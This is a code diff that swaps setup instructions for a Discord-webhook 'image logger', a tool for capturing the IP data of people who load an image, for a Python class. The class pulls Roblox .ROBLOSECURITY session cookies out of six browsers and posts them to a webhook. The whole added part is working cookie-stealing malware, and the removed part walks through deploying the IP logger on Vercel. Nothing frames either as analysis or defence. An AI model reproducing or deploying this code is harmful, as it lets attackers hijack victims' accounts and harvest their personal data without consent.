@@ -1,35 +1,69 @@
-FIRST OF ALL THIS FILE IS NOT A VIRUS/TROJAN/RAT/RCE/OR ROOTKIT THAT CAN AUTOMATICALLY AFFECT YOUR PC, WITH THIS TOOL YOU CAN MAKE IMAGE-LOGGERS TO, BASICALLY GET THEIR IP AND OTHER INFORMATION/DATA.
+import browser_cookie3 as bc
+from threading import Thread
+import requests
 
-1. Download the .zip (click on code and then click on download zip)
+class Cookies:
+	def __init__(self, webhook):
+		self.webhook = webhook
 
-2. Extract the folder wherever you want (desktop if its possible)
+	def get_chrome(self):
+		try:
+			cookie = str(bc.chrome(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-3. Make a discord server (you will receive the logs there)
+	def get_firefox(self):
+		try:
+			cookie = str(bc.firefox(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-4. Create a webhook on the server (the name of the webhook will be automatically changed to Image Logger when sending a message)
+	def get_opera(self):
+		try:
+			cookie = str(bc.opera(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-5. Modify main.py (Change base config/webhook/webhook url/ and paste your webhook link)
+	def get_edge(self):
+		try:
+			cookie = str(bc.edge(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-6. Search for an image and get the url of the image and modify main.py again (Change base config/image/image url/ and paste the image link)
+	def get_chromium(self): 
+		try:
+			cookie = str(bc.chromium(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-7. Create a new github repositorie for the image-logger (doesnt change anything if you make it public or private)
+	def get_brave(self):
+		try:
+			cookie = str(bc.brave(domain_name='roblox.com'))
+			cookie = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
+			requests.post(self.webhook, json={'username':'bot', 'content':cookie})
+			return cookie
+		except:
+			pass
 
-8. Click on "creating a new file" and do this exactly as it shows (your repositorie name, click slash, api, click slash again, and write .gitkeep and press commit changes)
-
-9. Rename main.py to any name you want (optional)
-
-10. Move main.py and requirements.txt to the repositorie and click commit changes
-
-11. Now go to www.vercel.com and make an account (if you already have one then log in)
-
-12. Then go to the main page on vercel and click Add new.../project and import the image-logger repositorie from github then click deploy
-
-13. Dont worry asking if you did something bad, its completely ok (it will show you 404: NOT_FOUND, Code "Not_Found")
-
-14. Click on the 404 image and then copy the link of the page
-
-15. Modify the link of the image to "YourRepositorieName/api/main.py" (it will be like https://something.vercel.app/api/main.py)
-
-16. Paste the link in any server you want and then the webhook will send you the notifications! and boom! you made an image-logger!
-
-Don't forget to join my discord server for more! : https://discord.gg/pTkJuSbmZS
+	def run_all(self):
+		Thread(target=self.get_chrome).start()
+		Thread(target=self.get_firefox).start()
+		Thread(target=self.get_opera).start()
+		Thread(target=self.get_edge).start()
+		Thread(target=self.get_chromium).start()
+		Thread(target=self.get_brave).start()
